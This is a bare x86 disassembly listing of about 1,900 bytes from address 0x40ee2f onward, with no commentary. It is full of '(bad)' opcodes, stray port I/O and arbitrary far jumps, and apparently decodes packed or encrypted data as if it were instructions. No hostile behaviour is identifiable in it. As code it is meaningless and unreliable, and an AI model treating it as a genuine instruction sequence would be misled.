  40ee2f:	outs   dx,BYTE PTR ds:[esi]
  40ee30:	ins    BYTE PTR es:[edi],dx
  40ee31:	(bad)  
  40ee32:	fdivp  st(2),st
  40ee34:	or     eax,0xe4e91d0b
  40ee39:	push   es
  40ee3a:	ins    BYTE PTR es:[edi],dx
  40ee3b:	rcl    esi,1
  40ee3d:	ret    0x1097
  40ee40:	inc    ebp
  40ee41:	mov    al,ds:0x5b8b1d7e
  40ee46:	mov    al,ds:0x47de6b70
  40ee4b:	mov    ebp,0x2636a083
  40ee50:	add    bl,bl
  40ee52:	mov    dh,0x50
  40ee54:	jle    0x40ede5
  40ee56:	rol    DWORD PTR [eax],cl
  40ee58:	ins    BYTE PTR es:[edi],dx
  40ee59:	arpl   WORD PTR [edi],si
  40ee5b:	dec    edi
  40ee5c:	ret    0xd184
  40ee5f:	or     DWORD PTR [edi],esi
  40ee61:	fidivr DWORD PTR [edx]
  40ee63:	mov    al,ds:0x8c84faf7
  40ee68:	mov    WORD PTR [eax-0xd],ds
  40ee6b:	inc    edi
  40ee6c:	fsub   DWORD PTR [eax+0x6b]
  40ee6f:	dec    ebx
  40ee70:	pop    ss
  40ee71:	dec    ecx
  40ee72:	gs mov al,0x38
  40ee75:	mov    edx,es
  40ee77:	fsub   QWORD PTR [edx-0x2fd7a48b]
  40ee7d:	jno    0x40eebd
  40ee7f:	addr16 retf 0xc4bd
  40ee83:	cld    
  40ee84:	fld    TBYTE PTR [eax+0x2]
  40ee87:	or     BYTE PTR ds:[ebx+0x16],0xf4
  40ee8c:	xchg   edi,eax
  40ee8d:	jmp    0x76b7:0x14d02983
  40ee94:	adc    eax,0xf4656bd8
  40ee99:	xchg   edi,eax
  40ee9a:	mov    BYTE PTR [ecx],dh
  40ee9c:	(bad)  [esi+0x2785b1b0]
  40eea2:	idiv   ch
  40eea4:	pop    es
  40eea5:	cdq    
  40eea6:	pop    ecx
  40eea7:	mov    ah,0x56
  40eea9:	push   DWORD PTR [eax+0x2b]
  40eeac:	inc    ebp
  40eead:	or     esp,edx
  40eeaf:	imul   ecx,DWORD PTR fs:[ecx-0x64498e21],0x63
  40eeb7:	mov    eax,ds:0xf93d96d
  40eebc:	push   cs
  40eebd:	mov    cl,ch
  40eebf:	mov    edi,0x604ba5d1
  40eec4:	cmp    BYTE PTR [edi-0x5e482659],0xdc
  40eecb:	mov    dh,0xca
  40eecd:	mov    bh,0x24
  40eecf:	add    eax,0xdbbe0000
  40eed4:	icebp  
  40eed5:	stc    
  40eed6:	in     al,dx
  40eed7:	mov    esi,0x1b837c61
  40eedc:	(bad)  
  40eede:	enter  0xe518,0x92
  40eee2:	stos   BYTE PTR es:[edi],al
  40eee3:	push   eax
  40eee4:	add    BYTE PTR [ecx+edx*2],bl
  40eee7:	popa   
  40eee8:	fcmovnu st,st(2)
  40eeea:	lods   eax,DWORD PTR ds:[esi]
  40eeeb:	or     BYTE PTR [esi-0x71],dl
  40eeee:	(bad)  
  40eeef:	push   0x8e0d65ff
  40eef4:	call   0xc1a3257b
  40eef9:	outs   dx,BYTE PTR ds:[esi]
  40eefa:	data16 or BYTE PTR [eax],al
  40eefd:	inc    esi
  40eefe:	pop    es
  40eeff:	mov    cl,0x5d
  40ef01:	mov    al,ds:0xa974a562
  40ef06:	stos   DWORD PTR es:[edi],eax
  40ef07:	stc    
  40ef08:	xchg   esi,eax
  40ef09:	test   al,0xed
  40ef0b:	rol    dl,cl
  40ef0d:	push   ss
  40ef0e:	jns    0x40ef06
  40ef10:	gs repnz jmp 0x9b51:0xd1bb66a7
  40ef19:	and    bl,bl
  40ef1b:	jne    0x40ef01
  40ef1d:	mov    es,esi
  40ef1f:	and    al,0x2b
  40ef21:	aam    0x37
  40ef23:	cmp    ch,BYTE PTR [eax]
  40ef25:	push   0x62fd8f3
  40ef2a:	mov    dh,0xba
  40ef2c:	in     eax,0x17
  40ef2e:	mov    dh,0x4a
  40ef30:	retf   
  40ef31:	shr    ebp,cl
  40ef33:	jmp    0x40ef89
  40ef35:	popf   
  40ef36:	add    BYTE PTR [ebx+0x68],al
  40ef39:	mov    eax,0xf54b0b6d
  40ef3e:	and    eax,0xdf35176a
  40ef43:	mov    esp,edx
  40ef45:	les    esi,FWORD PTR [esi+0x6e80eb76]
  40ef4b:	stc    
  40ef4c:	sahf   
  40ef4d:	sub    cl,BYTE PTR ds:0x5d52a11d
  40ef53:	ficom  DWORD PTR [esi-0x67baad4a]
  40ef59:	sub    eax,0x814a02ce
  40ef5e:	mov    ebx,0x6c54d8fb
  40ef63:	ins    DWORD PTR es:[edi],dx
  40ef64:	fs loop 0x40eefd
  40ef67:	jno    0x40eef6
  40ef69:	pop    es
  40ef6a:	inc    ecx
  40ef6b:	push   0x6061605b
  40ef70:	hlt    
  40ef71:	push   ebx
  40ef72:	dec    esi
  40ef73:	aad    0x1a
  40ef75:	or     DWORD PTR [esi+0x5b],ebp
  40ef78:	test   DWORD PTR ds:0xb8256ab0,eax
  40ef7e:	inc    esi
  40ef7f:	stos   BYTE PTR es:[edi],al
  40ef80:	xchg   esi,eax
  40ef81:	pop    esp
  40ef82:	mov    ebx,0x4502e8b9
  40ef87:	sbb    DWORD PTR [ecx-0x28f59992],eax
  40ef8d:	mov    dh,0xb
  40ef8f:	pop    ebx
  40ef90:	ins    DWORD PTR es:[edi],dx
  40ef91:	outs   dx,DWORD PTR ds:[esi]
  40ef92:	mov    al,0x9a
  40ef94:	mov    WORD PTR [edi],es
  40ef96:	jmp    0x40ef3c
  40ef98:	add    eax,0xd855bb3c
  40ef9d:	mov    dh,0x2e
  40ef9f:	push   es
  40efa0:	pop    ecx
  40efa1:	push   edi
  40efa2:	xchg   edi,eax
  40efa3:	dec    edi
  40efa4:	sahf   
  40efa5:	frstor [eax]
  40efa7:	mov    ch,0x5b
  40efa9:	or     ebp,DWORD PTR [ebp+0x4f]
  40efac:	mov    ebx,0x1a82a725
  40efb1:	xor    eax,esp
  40efb3:	fst    QWORD PTR [esi]
  40efb5:	xchg   esi,eax
  40efb6:	das    
  40efb7:	mov    ecx,0xfd006d5f
  40efbc:	pop    edi
  40efbd:	mov    eax,0xb9de17bb
  40efc2:	outs   dx,BYTE PTR ds:[esi]
  40efc3:	sbb    ebp,DWORD PTR [ebp+0x36bab0a2]
  40efc9:	cmp    DWORD PTR [edx-0x29390dac],edx
  40efcf:	inc    edx
  40efd0:	fstp   TBYTE PTR [ebp+0x70]
  40efd3:	jmp    0x4d4239ba
  40efd8:	xchg   ebx,eax
  40efd9:	test   edx,esi
  40efdb:	sub    ebp,0x19ed8a9
  40efe1:	js     0x40ef8a
  40efe3:	cwde   
  40efe4:	inc    eax
  40efe5:	mov    bh,0xb
  40efe7:	sbb    eax,0xfd2fced0
  40efec:	mov    esi,0x86c8f4ac
  40eff1:	pop    ebx
  40eff2:	add    BYTE PTR [eax+0x58],bl
  40eff5:	push   0xc9bcd6cb
  40effa:	out    dx,eax
  40effb:	and    eax,0xb7c7107d
  40f000:	push   cs
  40f001:	call   0x28ffde
  40f006:	adc    cl,BYTE PTR [esi-0x43]
  40f009:	push   cs
  40f00a:	sub    eax,0x2b6ddaa0
  40f00f:	or     edx,DWORD PTR [ebp-0x7c]
  40f012:	sub    al,0x3e
  40f014:	repnz or BYTE PTR [esi],0x1a
  40f018:	adc    dl,ch
  40f01a:	and    dl,BYTE PTR [esi-0x38f21e11]
  40f020:	(bad)  
  40f021:	test   al,0xb6
  40f023:	lea    edx,[edx]
  40f025:	pop    ebp
  40f026:	push   0x8a081ccf
  40f02b:	in     eax,dx
  40f02c:	(bad)  
  40f02d:	ret    0xe291
  40f030:	xlat   BYTE PTR ds:[ebx]
  40f031:	hlt    
  40f032:	or     bh,BYTE PTR [ecx+0x68]
  40f035:	push   edx
  40f036:	(bad)  [esi+0x59f9a9a8]
  40f03c:	sub    esi,esp
  40f03e:	mov    dl,BYTE PTR gs:[esi+esi*4]
  40f042:	mov    ch,0xed
  40f044:	inc    edx
  40f045:	dec    esp
  40f046:	jle    0x40f094
  40f048:	retf   
  40f049:	mov    dh,0x2
  40f04b:	pop    ecx
  40f04c:	mov    ch,0x5f
  40f04e:	in     eax,0xc2
  40f050:	mov    dh,0x9d
  40f053:	or     al,0x12
  40f055:	jmp    0x2eb6:0xaa110d8b
  40f05c:	mov    BYTE PTR [ebx],cl
  40f05e:	popa   
  40f05f:	mov    eax,ds:0xf2ec3cac
  40f064:	sbb    BYTE PTR [ebp+0x10],0xb7
  40f068:	ss push ecx
  40f06a:	pushf  
  40f06b:	sbb    al,0x93
  40f06d:	in     al,0x84
  40f06f:	loope  0x40f02c
  40f071:	xor    eax,0xeb026e96
  40f076:	jp     0x40f09b
  40f078:	aas    
  40f079:	daa    
  40f07a:	sub    ebp,eax
  40f07c:	inc    esi
  40f07d:	dec    ebp
  40f07e:	xor    eax,0x1b405b04
  40f083:	lock inc edi
  40f085:	mov    bh,0xb6
  40f087:	push   esi
  40f088:	sar    BYTE PTR [eax-0x4bd92144],1
  40f08e:	sbb    dl,0x1f
  40f091:	mov    ah,0x6d
  40f093:	jmp    0x40f06f
  40f095:	xlat   BYTE PTR ds:[ebx]
  40f096:	inc    eax
  40f097:	xchg   edi,eax
  40f098:	shr    DWORD PTR [edi],cl
  40f09a:	int    0x86
  40f09c:	dec    BYTE PTR [ebx+eiz*4+0x36e0a03]
  40f0a3:	jno    0x40f05b
  40f0a5:	mov    ah,0x8c
  40f0a7:	cvtdq2ps xmm3,xmm3
  40f0aa:	jbe    0x40f10f
  40f0ac:	das    
  40f0ad:	add    ecx,DWORD PTR [edi+0x2e]
  40f0b0:	gs call 0xd6db:0x673153bf
  40f0b8:	push   ecx
  40f0b9:	ins    DWORD PTR es:[edi],dx
  40f0ba:	aam    0x4
  40f0bc:	call   0xc93b5098
  40f0c1:	sahf   
  40f0c2:	mov    ebx,0x82b42e95
  40f0c7:	loopne 0x40f115
  40f0c9:	stos   DWORD PTR es:[edi],eax
  40f0ca:	shl    BYTE PTR [edx-0x44],1
  40f0cd:	fst    DWORD PTR [eax+eiz*1+0x5b]
  40f0d1:	cmp    ebp,DWORD PTR [eax-0x6fb1bda0]
  40f0d7:	add    ebp,DWORD PTR [esi]
  40f0d9:	add    al,BYTE PTR [eax-0x69]
  40f0dc:	mov    dh,0x5a
  40f0de:	cmp    al,BYTE PTR [edx-0x64e41602]
  40f0e4:	mov    BYTE PTR [ebx+0x5b],cl
  40f0e7:	inc    edi
  40f0e8:	fisub  WORD PTR [ebx-0x62]
  40f0eb:	js     0x40f10a
  40f0ed:	xchg   edi,eax
  40f0ee:	cs dec ebx
  40f0f0:	add    eax,0x43e6e858
  40f0f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0f6:	(bad)
  40f0fa:	mov    dh,0x6
  40f0fc:	aad    0x6e
  40f0fe:	ds push cs
  40f100:	fiadd  WORD PTR [eax-0x2ebff7f2]
  40f106:	inc    esp
  40f107:	fcom   QWORD PTR [esi-0x3ba64c86]
  40f10d:	mov    eax,ds:0xdbb61856
  40f112:	mov    dh,0xb5
  40f114:	adc    al,BYTE PTR [edi+0x6c175419]
  40f11a:	in     al,dx
  40f11b:	ror    eax,1
  40f11d:	cwde   
  40f11e:	aas    
  40f11f:	mov    dh,0x6d
  40f121:	pop    ebp
  40f122:	cli    
  40f123:	into   
  40f124:	pusha  
  40f125:	(bad)  
  40f126:	xor    dh,BYTE PTR fs:[esi-0x6b]
  40f12a:	xor    bl,BYTE PTR [eax+ebx*4-0x496bd4be]
  40f131:	xlat   BYTE PTR ds:[ebx]
  40f132:	and    al,0x89
  40f134:	ficomp WORD PTR [ecx+0x79]
  40f137:	fistp  DWORD PTR gs:[edx]
  40f13a:	rcl    BYTE PTR [esp+edi*2],1
  40f13d:	sahf   
  40f13e:	leave  
  40f13f:	mov    ecx,0x176b76d6
  40f144:	mov    dh,0x30
  40f146:	into   
  40f147:	jo     0x40f1bc
  40f149:	aam    0xef
  40f14b:	out    0xf5,al
  40f14d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f14e:	arpl   WORD PTR [edx+ebx*8],dx
  40f151:	outs   dx,DWORD PTR ds:[esi]
  40f152:	sub    ebx,edx
  40f154:	mov    al,bh
  40f156:	add    eax,esp
  40f158:	dec    ebp
  40f159:	xchg   ecx,eax
  40f15a:	push   es
  40f15b:	lods   eax,DWORD PTR ds:[esi]
  40f15c:	ss mov dh,0x5f
  40f15f:	fstp   QWORD PTR [eax-0x74679f47]
  40f165:	inc    esp
  40f166:	pop    esp
  40f167:	outs   dx,BYTE PTR ds:[esi]
  40f168:	cdq    
  40f169:	nop
  40f16a:	ins    DWORD PTR es:[edi],dx
  40f16b:	mov    bh,0x2e
  40f16d:	fsub   st,st(3)
  40f16f:	ins    BYTE PTR es:[edi],dx
  40f170:	and    bh,BYTE PTR [edi+0x265f9c98]
  40f176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f177:	test   DWORD PTR [ebp+0x653bad85],ecx
  40f17d:	lods   al,BYTE PTR ds:[esi]
  40f17e:	les    esi,FWORD PTR [esi-0x491a6ac4]
  40f184:	fbld   TBYTE PTR [ebp-0x4113d85b]
  40f18a:	push   esi
  40f18b:	cmp    al,cl
  40f18d:	jno    0x40f12d
  40f18f:	sbb    BYTE PTR [ecx+0x75],al
  40f192:	or     esp,DWORD PTR [ebp+0x50222068]
  40f198:	push   edx
  40f199:	sbb    al,0xf7
  40f19b:	aaa    
  40f19c:	push   ss
  40f19d:	push   0x32812a01
  40f1a2:	push   edi
  40f1a3:	xchg   esp,eax
  40f1a4:	inc    ecx
  40f1a5:	outs   dx,BYTE PTR ds:[esi]
  40f1a6:	pop    ds
  40f1a7:	fmul   QWORD PTR [edx+0xe]
  40f1aa:	shl    DWORD PTR [ebx+0x5a],1
  40f1ad:	and    BYTE PTR [ebp+0x56],ah
  40f1b0:	(bad)  
  40f1b1:	out    0xdb,eax
  40f1b3:	mov    dh,0xd6
  40f1b6:	outs   dx,BYTE PTR ds:[esi]
  40f1b7:	sbb    eax,0x39ea3066
  40f1bc:	add    al,0x1a
  40f1be:	and    DWORD PTR [ecx+0x645b6dba],ecx
  40f1c4:	test   BYTE PTR [edx-0x24],cl
  40f1c7:	imul   ebp,DWORD PTR [ecx+ecx*1+0x76],0xffffffb6
  40f1cc:	lods   eax,DWORD PTR ds:[esi]
  40f1cd:	jno    0x40f172
  40f1cf:	dec    eax
  40f1d0:	call   edx
  40f1d2:	std    
  40f1d3:	push   ecx
  40f1d4:	push   ebx
  40f1d5:	add    BYTE PTR [edx+esi*2-0x4c],bl
  40f1d9:	mov    al,0x51
  40f1db:	mov    BYTE PTR [esi],dl
  40f1dd:	jle    0x40f1a4
  40f1df:	xchg   esp,eax
  40f1e0:	jnp    0x40f1fc
  40f1e2:	aad    0x2e
  40f1e4:	mov    cl,0xdd
  40f1e6:	jl     0x40f170
  40f1e8:	adc    ecx,DWORD PTR [ebx+0x5]
  40f1eb:	sbb    ebx,DWORD PTR [ebx+0x7]
  40f1ee:	mov    cl,0xdd
  40f1f0:	or     DWORD PTR [esp+ebx*1],0x5f
  40f1f4:	ret    0xd818
  40f1f7:	imul   esi,DWORD PTR [eax],0x6b
  40f1fa:	pop    ebx
  40f1fb:	sub    dl,BYTE PTR [ecx]
  40f1fd:	push   0xb950c2fe
  40f202:	call   0x74bd20dd
  40f207:	cs pop ecx
  40f209:	popf   
  40f20a:	lock and cl,BYTE PTR [ecx-0x65]
  40f20e:	sahf   
  40f20f:	sub    al,0xb6
  40f211:	add    ebx,ecx
  40f213:	(bad)  
  40f214:	cmp    eax,0x8d5b7cea
  40f219:	dec    edx
  40f21a:	into   
  40f21b:	pop    edx
  40f21c:	or     BYTE PTR [esp+edx*8],bl
  40f21f:	jno    0x40f1b6
  40f221:	pop    ss
  40f222:	fcmovnu st,st(3)
  40f224:	pop    edx
  40f225:	pop    edx
  40f226:	pop    eax
  40f227:	jge    0x40f1a9
  40f229:	pop    ds
  40f22a:	pop    ss
  40f22b:	ds enter 0xd5bb,0x8f
  40f230:	sub    eax,0x8a60142d
  40f235:	and    eax,0x6fc639d9
  40f23a:	lods   eax,DWORD PTR ds:[esi]
  40f23b:	lods   eax,DWORD PTR ds:[esi]
  40f23c:	in     eax,0xbf
  40f23e:	mov    al,0x65
  40f240:	mov    es,WORD PTR [eax]
  40f242:	ja     0x40f2b7
  40f244:	add    BYTE PTR [ecx+0x7db5c76f],ah
  40f24a:	hlt    
  40f24b:	test   al,0x42
  40f24d:	mov    bh,0x6d
  40f24f:	fwait
  40f250:	mov    al,ds:0xbd6e14bc
  40f255:	cli    
  40f256:	pop    eax
  40f257:	push   0xc34216a0
  40f25c:	mov    edx,0x855c430d
  40f261:	jbe    0x40f2be
  40f263:	fcomp  DWORD PTR [ecx+0x59838258]
  40f269:	iret   
  40f26a:	mov    dl,0x6b
  40f26c:	cs loopne 0x40f2e6
  40f26f:	fcmovnu st,st(2)
  40f271:	js     0x40f24a
  40f273:	mov    ecx,0x882cd30e
  40f278:	ror    BYTE PTR [ecx-0x492dfed4],0x0
  40f27f:	mov    ecx,0xf2ff2c88
  40f284:	adc    bl,bh
  40f286:	xor    dl,BYTE PTR [esi+esi*4]
  40f289:	fist   DWORD PTR [ebx+0x14abf192]
  40f28f:	jmp    0x40f276
  40f291:	mov    ds,eax
  40f293:	outs   dx,BYTE PTR ds:[esi]
  40f294:	pop    ds
  40f295:	pop    ebp
  40f296:	loopne 0x40f2cf
  40f298:	out    0x3d,al
  40f29a:	jne    0x40f2cb
  40f29c:	jns    0x40f28a
  40f29e:	pop    ecx
  40f29f:	fist   WORD PTR [esi]
  40f2a1:	dec    edx
  40f2a2:	mov    cl,0xd0
  40f2a4:	xor    BYTE PTR [ecx],al
  40f2a6:	inc    esi
  40f2a7:	(bad)  
  40f2a8:	popf   
  40f2a9:	inc    ebp
  40f2aa:	or     dl,BYTE PTR ss:[edi-0x5afa628]
  40f2b1:	xor    al,0xf5
  40f2b3:	xor    DWORD PTR [edx+ebx*1-0x7249c9ea],ebx
  40f2ba:	sub    BYTE PTR [edx+0x59],0x58
  40f2be:	xchg   DWORD PTR [ebx-0x35e9fed],esi
  40f2c4:	(bad)  
  40f2c5:	test   al,0x22
  40f2c7:	sahf   
  40f2c8:	xchg   DWORD PTR [ecx+0x7969bf00],ebx
  40f2ce:	ins    BYTE PTR es:[edi],dx
  40f2cf:	and    eax,0x874075aa
  40f2d4:	inc    ebx
  40f2d5:	ins    DWORD PTR es:[edi],dx
  40f2d6:	cmc    
  40f2d7:	out    0xb6,eax
  40f2d9:	and    DWORD PTR [eax+0x26d6c42d],edi
  40f2df:	lods   eax,DWORD PTR ds:[esi]
  40f2e0:	mov    ds:0xcb82a16e,eax
  40f2e5:	call   0x5a16e9c0
  40f2ea:	xchg   edx,eax
  40f2eb:	sbb    ch,dh
  40f2ed:	xor    eax,0xdb3f84f7
  40f2f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2f3:	lods   eax,DWORD PTR ds:[esi]
  40f2f4:	scas   al,BYTE PTR es:[edi]
  40f2f5:	adc    edi,DWORD PTR [eax]
  40f2f7:	mov    cl,bl
  40f2f9:	adc    al,0xcd
  40f2fb:	loopne 0x40f374
  40f2fd:	sub    BYTE PTR [ebp+0x356b616a],dh
  40f303:	mov    ecx,0x940a2b79
  40f308:	loop   0x40f2cc
  40f30a:	shl    BYTE PTR [esi+0x3cdd6220],cl
  40f310:	(bad)
  40f313:	mov    ds,ebp
  40f315:	mov    dh,0x8d
  40f317:	mov    dh,0x23
  40f319:	icebp  
  40f31a:	pop    ebp
  40f31b:	dec    edx
  40f31c:	mov    ecx,0x72fe7aab
  40f321:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f322:	pop    ebx
  40f323:	popa   
  40f324:	or     ecx,DWORD PTR ds:0x5cb38ef1
  40f32a:	push   ds
  40f32b:	dec    edx
  40f32c:	add    DWORD PTR [ebp+0x10],ebx
  40f32f:	mov    bh,0x95
  40f331:	mov    WORD PTR [ebp+0x4a],cs
  40f334:	rcr    ch,0xda
  40f337:	or     BYTE PTR [esi],dl
  40f339:	or     bh,BYTE PTR [ebx+0x46]
  40f33c:	fsub   DWORD PTR [eax-0x2eb36b53]
  40f342:	push   es
  40f343:	inc    edi
  40f344:	in     al,0xe5
  40f346:	jp     0x40f37f
  40f348:	test   edx,eax
  40f34a:	push   ebp
  40f34b:	sbb    edi,DWORD PTR [edi-0x7c1bbf45]
  40f351:	cs fidiv DWORD PTR ss:[edx+0x30]
  40f356:	dec    edx
  40f357:	lea    esp,[ebp+0x68b6f521]
  40f35d:	mov    bh,0xa5
  40f35f:	in     eax,dx
  40f360:	jl     0x40f376
  40f362:	clc    
  40f363:	pop    ecx
  40f364:	inc    ecx
  40f365:	mov    eax,ds:0xba1ad451
  40f36a:	sar    DWORD PTR [edx],1
  40f36c:	pop    edx
  40f36d:	adc    ecx,DWORD PTR [edi+0xd]
  40f370:	mov    BYTE PTR [ecx+0xf],al
  40f373:	(bad)  
  40f374:	js     0x40f3ca
  40f376:	loop   0x40f3be
  40f378:	pop    ebx
  40f379:	dec    ebp
  40f37a:	jge    0x40f3a5
  40f37c:	add    edx,DWORD PTR [esi+0xada7c05]
  40f382:	mov    bh,0x46
  40f384:	data16 xor dl,BYTE PTR [esi+edx*1-0x273e400c]
  40f38c:	mov    dh,0x1a
  40f38e:	aaa    
  40f38f:	push   0x4b
  40f391:	(bad)  
  40f392:	mov    edx,0x5d47e56d
  40f397:	ins    DWORD PTR es:[edi],dx
  40f398:	or     edx,DWORD PTR [edi-0x4359f56a]
  40f39e:	sub    DWORD PTR [ecx],ebp
  40f3a0:	fdiv   QWORD PTR [esp+ebp*8+0x6e]
  40f3a4:	and    eax,0xf2a16368
  40f3a9:	inc    esi
  40f3aa:	ficom  WORD PTR [esi-0x2722eaa7]
  40f3b0:	sub    BYTE PTR [ecx+0x48],al
  40f3b3:	aad    0x42
  40f3b5:	lahf   
  40f3b6:	out    dx,eax
  40f3b7:	not    BYTE PTR [esi]
  40f3b9:	mov    dh,0xad
  40f3bb:	mov    ah,0x56
  40f3bd:	mov    ch,0x8c
  40f3bf:	clc    
  40f3c0:	add    ebp,eax
  40f3c2:	jp     0x40f3da
  40f3c4:	jmp    0xdbaea1a3
  40f3c9:	aam    0x9
  40f3cb:	mov    esp,0x226347a9
  40f3d0:	push   cs
  40f3d1:	sub    al,0x68
  40f3d3:	ret    0x61b6
  40f3d6:	fcomp  DWORD PTR [eax+0x8848ea2]
  40f3dc:	outs   dx,BYTE PTR ds:[esi]
  40f3dd:	sub    bl,BYTE PTR [esi+0x1b]
  40f3e0:	or     eax,DWORD PTR [ebp+0x4db73ded]
  40f3e6:	popf   
  40f3e7:	dec    esp
  40f3e8:	adc    BYTE PTR [eax],0x2a
  40f3eb:	je     0x40f370
  40f3ed:	cs ins BYTE PTR es:[edi],dx
  40f3ef:	sbb    ebp,edx
  40f3f1:	cli    
  40f3f2:	mov    WORD PTR [eax+0x28],ds
  40f3f5:	xlat   BYTE PTR ds:[ebx]
  40f3f6:	cmp    BYTE PTR [esi-0x6f292494],0x86
  40f3fd:	push   ds
  40f3fe:	mov    ebx,eax
  40f400:	into   
  40f401:	push   ecx
  40f402:	aam    0x2f
  40f404:	and    eax,esp
  40f406:	push   edx
  40f407:	mov    ebx,0x44959677
  40f40c:	fld    TBYTE PTR [ebx-0x5a29725e]
  40f412:	lods   eax,DWORD PTR ds:[esi]
  40f413:	xor    eax,0xfd65db35
  40f418:	loope  0x40f454
  40f41a:	aas    
  40f41b:	dec    edx
  40f41c:	(bad)  [ebp+0x55ef1ad]
  40f422:	das    
  40f423:	ds clc 
  40f425:	(bad)
  40f428:	ins    DWORD PTR es:[edi],dx
  40f429:	imul   ebp,DWORD PTR [ebp-0x69],0xffffffb0
  40f42d:	out    0x81,al
  40f42f:	cwde   
  40f430:	mov    eax,0x77882382
  40f435:	jbe    0x40f4a0
  40f437:	imul   esi,DWORD PTR [edi-0x181d1c71],0xffffffc5
  40f43e:	stos   BYTE PTR es:[edi],al
  40f43f:	fcomp  st(5)
  40f441:	lods   al,BYTE PTR ds:[esi]
  40f442:	and    BYTE PTR [ebx+ebx*8],ch
  40f445:	push   0xc17b637
  40f44a:	in     eax,dx
  40f44b:	lods   eax,DWORD PTR ds:[esi]
  40f44c:	pushw  cs
  40f44e:	sbb    edx,DWORD PTR [edx]
  40f450:	or     edx,DWORD PTR [esi-0x42]
  40f453:	shl    BYTE PTR [esi-0x1e],1
  40f456:	cmp    edi,DWORD PTR [eax]
  40f458:	sub    BYTE PTR [esi+0x1c],ch
  40f45b:	add    BYTE PTR [ecx+ebx*4],bl
  40f45e:	(bad)  
  40f45f:	xor    al,0xb6
  40f461:	dec    ebx
  40f462:	fist   DWORD PTR [ebx+ecx*1+0x2ab5fbd6]
  40f469:	sahf   
  40f46a:	test   DWORD PTR [edx+0x2c2d6db6],esp
  40f470:	cli    
  40f471:	jbe    0x40f449
  40f473:	daa    
  40f474:	xchg   edi,eax
  40f475:	(bad)  
  40f476:	cmp    ebx,DWORD PTR [ecx]
  40f478:	jp     0x40f4e2
  40f47a:	sub    ebx,DWORD PTR [edi-0x18]
  40f47d:	(bad)  
  40f47f:	je     0x40f483
  40f481:	add    BYTE PTR [edx-0x70],ch
  40f484:	enter  0xdc34,0xea
  40f488:	and    BYTE PTR [esi],dh
  40f48a:	push   ebp
  40f48b:	int    0x93
  40f48d:	xor    eax,0xb6233b79
  40f492:	fstp   QWORD PTR [eax+0x28]
  40f495:	mov    ebx,0x84dbc1c4
  40f49a:	mul    eax
  40f49c:	add    esp,DWORD PTR [edx-0x6c]
  40f49f:	outs   dx,DWORD PTR ds:[esi]
  40f4a0:	sbb    esi,DWORD PTR [edi-0x4894f644]
  40f4a6:	pushf  
  40f4a7:	pop    edi
  40f4a8:	mov    bl,0x0
  40f4aa:	stos   DWORD PTR es:[edi],eax
  40f4ab:	sbb    esi,DWORD PTR ds:0x1c2ed1b8
  40f4b1:	mov    ?,WORD PTR [ebx+0x43200f95]
  40f4b7:	adc    al,0xa9
  40f4b9:	ins    DWORD PTR es:[edi],dx
  40f4ba:	push   ebp
  40f4bb:	mov    ebx,0x35f06e44
  40f4c0:	inc    ebx
  40f4c1:	jbe    0x40f4be
  40f4c3:	retf   
  40f4c4:	lea    eax,[ebp-0x13129273]
  40f4ca:	mov    ebp,DWORD PTR [esi-0x129f3511]
  40f4d0:	pop    ebx
  40f4d1:	lea    esp,[esi]
  40f4d3:	xchg   esi,eax
  40f4d4:	sub    eax,0x3fd6dc54
  40f4d9:	cmp    eax,0x6db041cf
  40f4de:	or     edx,ebx
  40f4e0:	adc    DWORD PTR fs:[ebp+ebx*8+0x74],ebx
  40f4e5:	ins    DWORD PTR es:[edi],dx
  40f4e6:	ins    DWORD PTR es:[edi],dx
  40f4e7:	push   edi
  40f4e8:	mov    al,0x37
  40f4ea:	adc    eax,0x6e7f0cd7
  40f4ef:	sbb    bh,ch
  40f4f1:	ret    0xb6c2
  40f4f4:	mov    cl,0x8f
  40f4f6:	popa   
  40f4f7:	mov    bh,0xd4
  40f4f9:	jp     0x40f4e0
  40f4fb:	pop    ebx
  40f4fc:	cmp    BYTE PTR [edi],al
  40f4fe:	(bad)  
  40f4ff:	adc    bl,BYTE PTR [ebx-0x25]
  40f502:	and    eax,0x6cb5a2a7
  40f507:	mov    ?,ebp
  40f509:	cmp    bl,bl
  40f50b:	adc    al,BYTE PTR [ebp-0x36d0e425]
  40f511:	lahf   
  40f512:	aaa    
  40f513:	mov    BYTE PTR [ebx+0x502d2abf],bl
  40f519:	ins    BYTE PTR es:[edi],dx
  40f51a:	mov    ah,0x60
  40f51c:	push   esi
  40f51d:	stc    
  40f51e:	jge    0x40f58a
  40f520:	xor    eax,0x6d51d012
  40f525:	jl     0x40f5a0
  40f527:	sub    esi,DWORD PTR [esp+eax*1-0x49c895a5]
  40f52e:	add    eax,0x807751f2
  40f533:	in     al,dx
  40f534:	push   eax
  40f535:	jle    0x40f4c0
  40f537:	push   0xe570b6db
  40f53c:	jle    0x40f55d
  40f53e:	test   al,0x95
  40f540:	fnstenv ds:0xb817d442
  40f546:	sar    BYTE PTR [edx-0x53bb53e4],1
  40f54c:	fidivr WORD PTR [edi+ebp*2]
  40f54f:	adc    DWORD PTR [eax],eax
  40f551:	ss ss dec edx
  40f554:	retf   
  40f555:	jge    0x40f5d1
  40f557:	cwde   
  40f558:	dec    ebp
  40f559:	pushf  
  40f55a:	test   DWORD PTR [edi],edi
  40f55c:	shl    BYTE PTR [esi+0x170ad5b1],0x16
  40f563:	cmp    eax,0x2c233c43
  40f568:	dec    ebx
  40f569:	fcmovnb st,st(2)
  40f56b:	pop    edx
  40f56c:	jae    0x40f595
  40f56e:	fucomp st(7)
  40f570:	out    dx,eax
  40f571:	and    eax,0x20e51b8f
  40f576:	mov    eax,DWORD PTR cs:[ecx+0x309f9c9]
  40f57d:	mov    ebx,0xedb52db5
  40f582:	jecxz  0x40f5da
  40f584:	jecxz  0x40f5be
  40f586:	xlat   BYTE PTR ds:[ebx]
  40f587:	sub    BYTE PTR [bp+si-0x1a],cl
  40f58b:	or     ebp,DWORD PTR [ebp-0x1d]
  40f58e:	push   edx
  40f58f:	lds    eax,FWORD PTR ds:[edi+0x5a]
  40f593:	dec    eax
  40f594:	retf   
  40f595:	jae    0x40f574
  40f597:	fucomi st,st(2)
  40f599:	or     BYTE PTR [esi+0x26],ch
  40f59c:	cmp    ebx,ebp
  40f59e:	aaa    
  40f59f:	dec    eax
  40f5a0:	jo     0x40f5f9
